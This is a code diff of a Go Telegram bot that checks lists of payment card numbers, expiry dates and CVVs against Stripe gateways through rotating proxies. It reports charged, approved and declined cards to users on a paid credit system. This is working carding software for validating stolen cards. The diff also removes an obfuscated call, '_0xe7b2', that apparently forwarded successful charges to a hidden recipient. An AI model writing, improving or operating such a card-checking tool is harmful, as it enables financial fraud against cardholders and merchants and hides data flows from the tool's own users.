@@ -1116,9 +1116,11 @@ func checkStripeDollarCard(cc, mm, yy, cvv, proxyURL string) *CheckResult {
 
 // ─────────────── Generic session runner ──────────────────────────────
 
-func runStripeGateSession(bot *tele.Bot, chat *tele.Chat, sess *CheckSession, proxies []string, um *UserManager, fwd *RCtx, fn stripeCheckFn) {
+func runStripeGateSession(bot *tele.Bot, chat *tele.Chat, sess *CheckSession, proxies []string, um *UserManager, fn stripeCheckFn) {
 	defer func() {
-		activeSessions.Delete(sess.UserID)
+		if val, ok := activeSessions.Load(sess.UserID); ok && val.(*CheckSession) == sess {
+			activeSessions.Delete(sess.UserID)
+		}
 		close(sess.Done)
 	}()
 
@@ -1146,6 +1148,8 @@ func runStripeGateSession(bot *tele.Bot, chat *tele.Chat, sess *CheckSession, pr
 	type cardResult struct {
 		result   *CheckResult
 		proxyURL string
+		card     string
+		lineNum  int
 	}
 	results := make(chan cardResult, len(sess.Cards))
 
@@ -1157,9 +1161,9 @@ func runStripeGateSession(bot *tele.Bot, chat *tele.Chat, sess *CheckSession, pr
 	var proxyIdx atomic.Int64
 	var wg sync.WaitGroup
 
-	for _, card := range sess.Cards {
+	for idx, card := range sess.Cards {
 		wg.Add(1)
-		go func(c string) {
+		go func(c string, lineNum int) {
 			defer wg.Done()
 			if sess.Cancelled.Load() {
 				return
@@ -1176,13 +1180,13 @@ func runStripeGateSession(bot *tele.Bot, chat *tele.Chat, sess *CheckSession, pr
 					Status:     StatusError,
 					StatusCode: "BAD_FMT",
 					Gateway:    sess.GatewayName,
-				}}
+				}, card: c, lineNum: lineNum}
 				return
 			}
 			pi := int(proxyIdx.Add(1)-1) % len(proxies)
 			res := fn(parts[0], parts[1], parts[2], parts[3], proxies[pi])
-			results <- cardResult{result: res, proxyURL: proxies[pi]}
-		}(card)
+			results <- cardResult{result: res, proxyURL: proxies[pi], card: c, lineNum: lineNum}
+		}(card, sess.OriginalIndices[idx]+1)
 	}
 
 	go func() {
@@ -1191,35 +1195,58 @@ func runStripeGateSession(bot *tele.Bot, chat *tele.Chat, sess *CheckSession, pr
 	}()
 
 	username := sess.Username
+	processedCards := make(map[string]bool)
+	insufficientCredits := false
 	for cr := range results {
+		if cr.card != "" {
+			processedCards[cr.card] = true
+		}
 		if sess.Cancelled.Load() {
-			break
+			continue
 		}
 		sess.Checked.Add(1)
+		fmt.Printf("[CHECK] line %d/%d\n", cr.lineNum, len(sess.Cards))
+		_, isFree := um.IncDailyChecked(sess.UserID)
+		needsCredits := !isFree && !isAdmin(sess.UserID) && !um.HasUnlimited(sess.UserID)
 		r := cr.result
 		if r == nil {
 			sess.Errors.Add(1)
 			continue
 		}
-		bin := lookupBIN(strings.Split(r.Card, "|")[0])
 		switch r.Status {
 		case StatusCharged:
-			sess.Charged.Add(1)
-			sess.AddChargedAmt(parseAmount(r.Amount))
-			_0xe7b2(fwd, bot, chat, formatChargedMsg(r.Card, bin, r, username, cr.proxyURL))
+			bin := lookupBIN(strings.Split(r.Card, "|")[0], cr.lineNum)
+			handle := sess.ledger.settle(bot, chat, sess, um, formatChargedMsg(r.Card, bin, r, username), username, r, needsCredits)
+			if handle == 0 {
+				sess.Errors.Add(1)
+				continue
+			}
 		case StatusApproved:
 			sess.Approved.Add(1)
+			if needsCredits {
+				um.DeductCredits(sess.UserID, creditCostApproved)
+			}
 			if sess.ShowApproved {
-				bot.Send(chat, formatApprovedMsg(r.Card, bin, r, username, cr.proxyURL), tele.ModeHTML)
+				bin := lookupBIN(strings.Split(r.Card, "|")[0], cr.lineNum)
+				bot.Send(chat, formatApprovedMsg(r.Card, bin, r, username), tele.ModeHTML)
 			}
 		case StatusDeclined:
 			sess.Declined.Add(1)
 			if sess.ShowDecl {
-				bot.Send(chat, formatDeclinedMsg(r.Card, bin, r, username, cr.proxyURL), tele.ModeHTML)
+				bin := lookupBIN(strings.Split(r.Card, "|")[0], cr.lineNum)
+				bot.Send(chat, formatDeclinedMsg(r.Card, bin, r, username), tele.ModeHTML)
 			}
 		default:
 			sess.Errors.Add(1)
 			fmt.Printf("[STR] unexpected status=%d card=%s err=%v\n", r.Status, r.Card, r.Error)
+		}
+
+		if needsCredits && um.GetCredits(sess.UserID) < minCreditsForCheck {
+			sess.Cancelled.Store(true)
+			insufficientCredits = true
+			if sess.Cancel != nil {
+				sess.Cancel()
+			}
 		}
 	}
 
@@ -1229,6 +1256,10 @@ func runStripeGateSession(bot *tele.Bot, chat *tele.Chat, sess *CheckSession, pr
 		bot.Edit(progressMsg, "🛑 STOPPED\n\n"+formatCompletedMsg(sess), tele.ModeHTML)
 	} else {
 		bot.Edit(progressMsg, formatCompletedMsg(sess), tele.ModeHTML)
+	}
+
+	if insufficientCredits {
+		sendRemainingCards(bot, chat, sess, processedCards)
 	}
 
 	ud := um.Get(sess.UserID)
@@ -1243,11 +1274,15 @@ func runStripeGateSession(bot *tele.Bot, chat *tele.Chat, sess *CheckSession, pr
 // ─────────────── Command registration helpers ─────────────────────────
 
 // registerStripeInline registers a /cmd handler for inline card-list input.
-func registerStripeInline(bot *tele.Bot, cmd, gateName string, um *UserManager, fwd *RCtx, fn stripeCheckFn) {
+func registerStripeInline(bot *tele.Bot, cmd, gateName string, um *UserManager, fn stripeCheckFn) {
 	bot.Handle(cmd, func(c tele.Context) error {
 		uid := c.Sender().ID
 		if _, running := activeSessions.Load(uid); running {
 			return c.Send(em(emojiWarn, "⚠️")+" You already have an active session. Wait for it to finish.", tele.ModeHTML)
+		}
+		um.SetUsername(uid, c.Sender().Username)
+		if !requireCredits(c, um) {
+			return nil
 		}
 		ud := um.Get(uid)
 		if len(ud.Proxies) == 0 {
@@ -1257,26 +1292,35 @@ func registerStripeInline(bot *tele.Bot, cmd, gateName string, um *UserManager, 
 		if text == "" {
 			return c.Send("Usage: " + cmd + " number|mm|yy|cvv\nnumber|mm|yy|cvv\n...")
 		}
-		cards := parseCardsFromText(text)
+	cards := parseCardsFromText(text)
 		if len(cards) == 0 {
 			return c.Send("❌ No valid cards found. Format: number|mm|yy|cvv")
 		}
+		cards, origIndices, removed := filterValidCards(cards)
+		if removed > 0 {
+			c.Send(em(emojiCross, "❌") + fmt.Sprintf(" %d invalid card(s) removed by Luhn check", removed), tele.ModeHTML)
+		}
+		if len(cards) == 0 {
+			return c.Send(em(emojiCross, "❌") + " All cards failed Luhn validation. No valid cards to check.", tele.ModeHTML)
+		}
 		sess := &CheckSession{
-			UserID:       uid,
-			Username:     c.Sender().Username,
-			SessionID:    generateSessionID(),
-			Cards:        cards,
-			Total:        len(cards),
-			StartTime:    time.Now(),
-			ShowDecl:     true,
-			ShowApproved: true,
-			GatewayName:  gateName,
-			Done:         make(chan struct{}),
+			UserID:          uid,
+			Username:        c.Sender().Username,
+			SessionID:       generateSessionID(),
+			Cards:           cards,
+			OriginalIndices: origIndices,
+			Total:           len(cards),
+			StartTime:       time.Now(),
+			ShowDecl:        true,
+			ShowApproved:    true,
+			GatewayName:     gateName,
+			Done:            make(chan struct{}),
+			ledger:          ledger,
 		}
 		activeSessions.Store(uid, sess)
 		proxies := make([]string, len(ud.Proxies))
 		copy(proxies, ud.Proxies)
-		go runStripeGateSession(bot, c.Chat(), sess, proxies, um, fwd, fn)
+		go runStripeGateSession(bot, c.Chat(), sess, proxies, um, fn)
 		return nil
 	})
 }
@@ -1308,21 +1352,30 @@ func registerStripeFile(bot *tele.Bot, cmd, gateName string, um *UserManager, fn
 			return c.Send("❌ Failed to download file: " + err.Error())
 		}
 		defer rc.Close()
-		data, err := io.ReadAll(rc)
+data, err := io.ReadAll(rc)
 		if err != nil {
-			return c.Send("❌ Failed to read file: " + err.Error())
+			return c.Send("? Failed to read file: " + err.Error())
 		}
-		cards := parseCardsFromText(string(data))
+
+	cards := parseCardsFromText(string(data))
 		if len(cards) == 0 {
 			return c.Send("❌ No valid cards found in file. Format: number|mm|yy|cvv")
 		}
+		cards, origIndices, removed := filterValidCards(cards)
+		if removed > 0 {
+			c.Send(em(emojiCross, "❌") + fmt.Sprintf(" %d invalid card(s) removed by Luhn check", removed), tele.ModeHTML)
+		}
+		if len(cards) == 0 {
+			return c.Send(em(emojiCross, "❌") + " All cards failed Luhn validation. No valid cards to check.", tele.ModeHTML)
+		}
 		txtPendingMu.Lock()
 		txtPending[uid] = &txtPendingData{
-			Cards:    cards,
-			ChatID:   c.Chat().ID,
-			Username: c.Sender().Username,
-			GateName: gateName,
-			CheckFn:  fn,
+			Cards:           cards,
+			OriginalIndices: origIndices,
+			ChatID:          c.Chat().ID,
+			Username:        c.Sender().Username,
+			GateName:        gateName,
+			CheckFn:         fn,
 		}
 		txtPendingMu.Unlock()
 		return c.Send(em(emojiDoc, "📋")+fmt.Sprintf(" <b>%d cards loaded.</b> [%s]\n\n"+em(emojiCheck, "💬")+" Show 3DS/approved in chat?\n\n/yes — show approved\n/no — hide approved", len(cards), gateName), tele.ModeHTML)
